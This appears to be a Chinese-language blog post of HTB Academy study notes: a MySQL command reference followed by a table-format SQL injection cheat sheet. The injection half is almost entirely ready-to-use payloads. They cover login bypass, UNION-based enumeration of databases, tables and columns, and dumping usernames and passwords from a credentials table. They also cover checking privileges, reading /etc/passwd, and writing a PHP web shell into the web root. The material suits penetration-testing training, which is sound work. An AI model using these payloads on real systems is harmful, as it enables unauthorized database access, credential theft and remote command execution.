+++
author = "Lulaide"
title = "SQL注入常用命令"
date = "2024-10-09"
description = "常用SQL命令--HTB笔记"
tags = [
    "SQL",
    "Linux"
]
categories = ["教程&文档"]
image = "image.png"
+++



# MySQL 常用命令

## 一般命令
| 命令                                                      | 描述                   |
|---------------------------------------------------------|----------------------|
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`    | 登录 MySQL 数据库      |
| `SHOW DATABASES`                                       | 列出可用的数据库       |
| `USE users`                                           | 切换到数据库          |

## 表格操作
| 命令                                                      | 描述                   |
|---------------------------------------------------------|----------------------|
| `CREATE TABLE logins (id INT, ...)`                   | 添加新表              |
| `SHOW TABLES`                                         | 列出当前数据库中可用的表 |
| `DESCRIBE logins`                                     | 显示表属性和列        |
| `INSERT INTO table_name VALUES (value_1, ..)`        | 向表中添加值          |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | 向特定列添加值        |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | 更新表值              |

## 列操作
| 命令                                                      | 描述                   |
|---------------------------------------------------------|----------------------|
| `SELECT * FROM table_name`                             | 显示表中的所有列      |
| `SELECT column1, column2 FROM table_name`             | 显示表中的特定列      |
| `DROP TABLE logins`                                   | 删除表                |
| `ALTER TABLE logins ADD newColumn INT`                | 添加新列              |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | 重命名列              |
| `ALTER TABLE logins MODIFY oldColumn DATE`            | 更改列数据类型        |
| `ALTER TABLE logins DROP oldColumn`                   | 删除列                |

## 输出操作
| 命令                                                      | 描述                   |
|---------------------------------------------------------|----------------------|
| `SELECT * FROM logins ORDER BY column_1`               | 按列排序              |
| `SELECT * FROM logins ORDER BY column_1 DESC`          | 按列降序排序          |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`  | 按两列排序            |
| `SELECT * FROM logins LIMIT 2`                         | 仅显示前两个结果      |
| `SELECT * FROM logins LIMIT 1, 2`                      | 仅显示从索引 2 开始的前两个结果 |
| `SELECT * FROM table_name WHERE <condition>`           | 列出符合条件的结果    |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`    | 列出名称与给定字符串相似的结果 |

## MySQL 运算符优先级
1. 除法 (`/`)、乘法 (`*`) 和模数 (`%`)
2. 加法 (`+`) 和减法 (`-`)
3. 比较 (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. 不是 (`!`)
5. 和 (`&&`)
6. 或者 (`||`)

# SQL 注入

## 有效载荷
| 有效载荷                       | 描述                     |
|------------------------------|------------------------|
| `admin' or '1'='1`          | 基本身份验证绕过         |
| `admin')-- -`                | 基本身份验证绕过（带注释）|

## 身份验证绕过负载
| 有效载荷                       | 描述                     |
|------------------------------|------------------------|
| `' order by 1-- -`           | 使用以下方法检测列数       |
| `cn' UNION select 1,2,3-- -` | 使用 Union 注入检测列数   |
| `cn' UNION select 1,@@version,3,4-- -` | 基本 Union 注入       |
| `UNION select username, 2, 3, 4 from passwords-- -` | 4 列联合注射  |

## 数据库枚举
| 有效载荷                                       | 描述                       |
|----------------------------------------------|--------------------------|
| `SELECT @@version`                          | 使用查询输出对 MySQL 进行指纹识别 |
| `SELECT SLEEP(5)`                           | 指纹识别 MySQL，无输出       |
| `cn' UNION select 1,database(),2,3-- -`     | 当前数据库名称               |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | 列出所有数据库               |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | 列出特定数据库中的所有表 |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | 列出特定表中的所有列 |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | 从另一个数据库的表中转储数据 |

## 特权
| 有效载荷                                               | 描述                   |
|------------------------------------------------------|----------------------|
| `cn' UNION SELECT 1, user(), 3, 4-- -`              | 查找当前用户           |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | 查找用户是否具有管理员权限 |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | 查找所有用户权限     |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | 查找可以通过 MySQL 访问的目录 |

## 文件注入
| 有效载荷                                           | 描述                   |
|--------------------------------------------------|----------------------|
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | 读取本地文件           |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | 将字符串写入本地文件     |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | 将 web shell 写入基础 web 目录 |



[**HTB Academy**](https://academy.hackthebox.com/)